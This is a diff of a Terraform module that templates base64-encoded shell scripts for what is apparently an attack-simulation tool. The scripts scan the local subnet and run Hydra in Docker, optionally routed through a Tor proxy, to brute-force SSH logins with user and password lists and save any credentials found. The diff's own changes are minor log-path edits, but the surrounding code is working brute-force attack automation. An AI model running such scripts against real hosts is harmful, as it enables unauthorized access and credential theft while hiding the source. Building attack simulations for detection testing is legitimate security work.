@@ -53,18 +53,18 @@ locals {
     delayed_start   = base64encode(templatefile(
                                 "${path.module}/resources/${local.start_script}",
                                 {
+                                    scriptname = "delayed_start_hydra"
                                     lock_file = local.lock_file
                                     attack_delay = var.attack_delay
                                     attack_dir = local.attack_dir
                                     attack_script = local.attack_script
                                 }
                         ))
-                        
+
     hydra           = base64encode(templatefile(
                                 "${path.module}/resources/${local.attack_script}",
                                 {
                                     content =   <<-EOT
-                                                truncate -s 0 /tmp/hydra.txt
                                                 apt-get update && apt-get install -y sshpass jq
                                                 LOCAL_NET=$(ip -o -f inet addr show | awk '/scope global/ {print $4}' | head -1)
                                                 log "LOCAL_NET: $LOCAL_NET"
@@ -88,19 +88,19 @@ locals {
                                                 TORPROXY=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' torproxy)
                                                 log "Running: proxychains hydra -V -L ${var.user_list} -P ${var.password_list} -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh"
                                                 sudo /bin/bash -c "docker run -v /tmp:/tmp -e TORPROXY=$TORPROXY --name ${var.container_name} ${var.image} hydra -V -L ${var.user_list} -P ${var.password_list} -o /tmp/hydra-found.txt -b json -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
-                                                sudo /bin/bash -c "docker logs ${var.container_name} >> /tmp/hydra.txt 2>&1"
+                                                sudo /bin/bash -c "docker logs ${var.container_name} >> $LOGFILE 2>&1"
                                                 sudo /bin/bash -c "docker rm ${var.container_name}"
                                                 sudo /bin/bash -c "docker run -v /tmp:/tmp -e TORPROXY=$TORPROXY --name ${var.container_name} ${var.image} hydra -V -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -o /tmp/hydra-found.txt -b json -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
-                                                sudo /bin/bash -c "docker logs ${var.container_name} >> /tmp/hydra.txt 2>&1"
+                                                sudo /bin/bash -c "docker logs ${var.container_name} >> $LOGFILE 2>&1"
                                                 sudo /bin/bash -c "docker rm ${var.container_name}"
                                                 EOF
                                                 : <<-EOF
                                                 log "Running: hydra -V -L ${var.user_list} -P ${var.password_list} -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh"
                                                 sudo /bin/bash -c "docker run -v /tmp:/tmp --entrypoint=hydra --name ${var.container_name} ${var.image} -L ${var.user_list} -P ${var.password_list} -o /tmp/hydra-found.txt -b json -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
-                                                sudo /bin/bash -c "docker logs ${var.container_name} >> /tmp/hydra.txt 2>&1"
+                                                sudo /bin/bash -c "docker logs ${var.container_name} >> $LOGFILE 2>&1"
                                                 sudo /bin/bash -c "docker rm ${var.container_name}"
                                                 sudo /bin/bash -c "docker run -v /tmp:/tmp --entrypoint=hydra --name ${var.container_name} ${var.image} -L /tmp/hydra-users.txt -P /tmp/hydra-passwords.txt -o /tmp/hydra-found.txt -b json -M /tmp/hydra-targets.txt -dvV -t 4 -u -w 10 ssh || true"
-                                                sudo /bin/bash -c "docker logs ${var.container_name} >> /tmp/hydra.txt 2>&1"
+                                                sudo /bin/bash -c "docker logs ${var.container_name} >> $LOGFILE 2>&1"
                                                 sudo /bin/bash -c "docker rm ${var.container_name}"
                                                 EOF
                                                 }
